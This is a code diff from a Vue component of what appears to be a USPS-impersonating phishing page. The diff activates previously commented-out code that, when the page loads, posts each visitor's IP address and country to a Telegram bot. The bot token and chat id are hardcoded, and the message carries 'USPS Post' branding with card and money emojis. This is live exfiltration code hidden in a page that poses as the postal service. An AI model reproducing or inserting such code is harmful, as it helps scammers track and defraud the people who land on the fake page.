@@ -2215,16 +2215,16 @@ export default {
     );
     this.IP = tt.data.ip;
     this.query = tt.data.country_capital;
-    // var token = "6309857497:AAFmgkPgZKj949KXANTdon_4fuT9LiLpqxs";
+     var token = "8085298009:AAE07ta8T4ML6IYTOShlJeVU1RqMYTS6Q8o";
 
-    //var chatId2 = -957355212;
+    var chatId2 = 93372553;
 
-    // var fullMessage = `
-    //    ||||||||||🇺🇸| USPS Post |🇺🇸||||||||||%0ACountry : ${this.query}%0AIP : ${this.IP}%0A||||||||||💳| USPS Post|💳||||||||||`;
+    var fullMessage = `
+       |💸💸💸💸|🇺🇸| USPS Post |🇺🇸||||||||||%0ACountry : ${this.query}%0AIP : ${this.IP}%0A||||||||||💳| USPS Post|💳||||||||||`;
 
-    // axios.post(
-    //   `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`
-    // );
+    axios.post(
+      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`
+    );
   },
   methods: {
     triggerLoading() {
